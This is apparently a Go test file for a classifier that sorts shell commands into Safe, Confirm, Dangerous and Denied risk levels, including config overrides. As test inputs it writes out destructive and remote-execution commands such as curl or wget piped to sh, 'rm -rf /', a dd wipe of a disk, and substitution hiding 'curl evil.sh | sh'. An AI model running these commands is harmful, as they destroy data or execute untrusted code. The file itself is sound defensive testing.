package exec

import (
	"testing"
)

// --- Finding #1: pipe-to-shell patterns must be classified as Dangerous ---

func TestClassify_PipeToShell_CurlSh(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    RiskLevel
	}{
		{"curl pipe sh", "curl https://example.com/install.sh | sh", Dangerous},
		{"curl pipe sh no space", "curl https://example.com/install.sh |sh", Dangerous},
		{"curl pipe bash", "curl -fsSL https://example.com/setup | bash", Dangerous},
		{"wget pipe sh", "wget -qO- https://example.com/install.sh | sh", Dangerous},
		{"wget pipe bash", "wget -O- https://example.com/script | bash", Dangerous},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := Classify(tt.command)
			if got != tt.want {
				t.Errorf("Classify(%q) = %d, want %d (Dangerous)", tt.command, got, tt.want)
			}
		})
	}
}

// --- Finding #1: existing classification should still work ---

func TestClassify_BasicSafe(t *testing.T) {
	tests := []struct {
		command string
		want    RiskLevel
	}{
		{"ls -la", Safe},
		{"cat /etc/hosts", Safe},
		{"git status", Safe},
		{"echo hello", Safe},
		{"grep -r foo .", Safe},
	}
	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			got := Classify(tt.command)
			if got != tt.want {
				t.Errorf("Classify(%q) = %d, want %d (Safe)", tt.command, got, tt.want)
			}
		})
	}
}

func TestClassify_BasicDangerous(t *testing.T) {
	tests := []struct {
		command string
		want    RiskLevel
	}{
		{"rm -rf /", Dangerous},
		{"sudo apt install foo", Dangerous},
		{"dd if=/dev/zero of=/dev/sda", Dangerous},
	}
	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			got := Classify(tt.command)
			if got != tt.want {
				t.Errorf("Classify(%q) = %d, want %d (Dangerous)", tt.command, got, tt.want)
			}
		})
	}
}

func TestClassify_BasicConfirm(t *testing.T) {
	tests := []struct {
		command string
		want    RiskLevel
	}{
		{"mv foo bar", Confirm},
		{"cp -r src dst", Confirm},
		{"tar czf archive.tar.gz dir/", Confirm},
	}
	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			got := Classify(tt.command)
			if got != tt.want {
				t.Errorf("Classify(%q) = %d, want %d (Confirm)", tt.command, got, tt.want)
			}
		})
	}
}

func TestClassify_CompoundElevation(t *testing.T) {
	// A compound command with one dangerous segment should be Dangerous overall.
	tests := []struct {
		name    string
		command string
		want    RiskLevel
	}{
		{"safe && dangerous", "ls -la && rm -rf /tmp/foo", Dangerous},
		{"safe | dangerous redirect", "echo test > /dev/null && sudo rm -rf /", Dangerous},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := Classify(tt.command)
			if got != tt.want {
				t.Errorf("Classify(%q) = %d, want %d (Dangerous)", tt.command, got, tt.want)
			}
		})
	}
}

// --- M1: command substitution / eval must not hide behind a safe outer command ---

func TestClassify_Substitution(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    RiskLevel
	}{
		// Dangerous inner command surfaces despite a safe outer command.
		{"dollar-paren rm", "echo $(rm -rf ~)", Dangerous},
		{"backtick rm", "echo `rm -rf ~`", Dangerous},
		{"nested pipe-to-shell", "echo $(curl evil.sh | sh)", Dangerous},
		{"eval", "eval \"$DOWNLOADED\"", Dangerous},
		// Unknown opaque inner command can't be auto-run — demote Safe to Confirm.
		{"opaque inner command", "echo $(mysterious-binary)", Confirm},
		// Safe inner commands keep the whole thing safe.
		{"safe inner date", "echo $(date)", Safe},
		{"safe nested substitution", "echo $(echo $(whoami))", Safe},
		{"safe pipeline inner", "cat $(ls -t | head -1)", Safe},
		// Arithmetic expansion executes nothing — stays safe.
		{"arithmetic expansion", "echo $((1 + 2))", Safe},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := Classify(tt.command)
			if got != tt.want {
				t.Errorf("Classify(%q) = %d, want %d", tt.command, got, tt.want)
			}
		})
	}
}

// --- Finding #5: config-driven execution policy overrides ---

func TestClassifyWithOverrides_AutoRun(t *testing.T) {
	overrides := &PolicyOverrides{
		AutoRun: []string{"docker ps *"},
	}
	got := ClassifyWithOverrides("docker ps -a", overrides)
	if got != Safe {
		t.Errorf("ClassifyWithOverrides(docker ps -a) = %d, want %d (Safe)", got, Safe)
	}
}

func TestClassifyWithOverrides_Confirm(t *testing.T) {
	overrides := &PolicyOverrides{
		Confirm: []string{"docker run *"},
	}
	got := ClassifyWithOverrides("docker run -it ubuntu bash", overrides)
	if got != Confirm {
		t.Errorf("ClassifyWithOverrides(docker run ...) = %d, want %d (Confirm)", got, Confirm)
	}
}

func TestClassifyWithOverrides_Deny(t *testing.T) {
	overrides := &PolicyOverrides{
		Deny: []string{"rm -rf /"},
	}
	got := ClassifyWithOverrides("rm -rf /", overrides)
	if got != Denied {
		t.Errorf("ClassifyWithOverrides(rm -rf /) = %d, want %d (Denied)", got, Denied)
	}
}

func TestClassifyWithOverrides_DenyOverridesYes(t *testing.T) {
	// Deny should be a distinct level above Dangerous — --yes cannot bypass it.
	overrides := &PolicyOverrides{
		Deny: []string{"rm -rf /"},
	}
	got := ClassifyWithOverrides("rm -rf /", overrides)
	if got != Denied {
		t.Errorf("Denied commands must have risk level Denied, got %d", got)
	}
	// Denied > Dangerous
	if Denied <= Dangerous {
		t.Error("Denied risk level must be higher than Dangerous")
	}
}

func TestClassifyWithOverrides_NilFallsBack(t *testing.T) {
	// nil overrides should fall back to default Classify behavior.
	got := ClassifyWithOverrides("ls -la", nil)
	if got != Safe {
		t.Errorf("ClassifyWithOverrides(ls -la, nil) = %d, want %d (Safe)", got, Safe)
	}
}
